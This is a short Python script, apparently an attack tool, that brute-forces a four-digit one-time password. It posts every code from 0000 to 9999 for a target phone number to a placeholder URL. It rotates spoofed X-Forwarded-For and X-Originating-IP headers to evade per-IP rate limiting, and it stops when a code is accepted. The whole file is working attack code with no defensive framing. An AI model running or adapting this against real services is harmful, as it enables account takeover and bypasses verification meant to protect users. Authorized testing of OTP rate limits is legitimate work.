import requests
import random
import json

# Function to generate a random IP address
def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Base URL
url = "https://your-url"

# Request Headers
headers = {
    "Host": "example.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "X-Platform": "desktop-web",
    "X-Request-Id": "b4835ad8-d5fc-7c140b24a",
    "X-Language-Code": "en",
    "X-Device-Id": "3-96fe-3fe5d17fd580",
    "X-Firebase-App-Instance-Id": "undefined",
    "Origin": "https://example.com",
    "Referer": "https://exapmle.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "Dnt": "1",
    "Sec-Gpc": "1",
    "Priority": "u=0",
    "Te": "trailers",
}

# Base Payload
base_payload = {
    "phone": "no",  # Target phone number
    "otp": "0000",           # OTP placeholder
    "signature": "3bdf70f1e9143c049cc85f1187db91e924f1ebf2",
}

# Loop through all possible OTPs (0000-9999)
for otp in range(10000):  # Generates 0000 to 9999
    otp_str = f"{otp:04d}"  # Format OTP to 4 digits
    base_payload["otp"] = otp_str  # Update OTP in payload

    # Update headers with random IPs
    headers["X-Originating-IP"] = random_ip()
    headers["X-Forwarded-For"] = random_ip()

    try:
        # Send the POST request
        response = requests.post(
            url,
            data=json.dumps(base_payload),
            headers=headers,
        )

        # Print request status
        print(f"OTP: {otp_str}, IP: {headers['X-Originating-IP']}, Status: {response.status_code}")

        # Stop if OTP is correct (assuming 200 status means success)
        if response.status_code == 200:
            print(f"Valid OTP found: {otp_str}")
            break
    except requests.RequestException as e:
        print(f"Error: {e}")
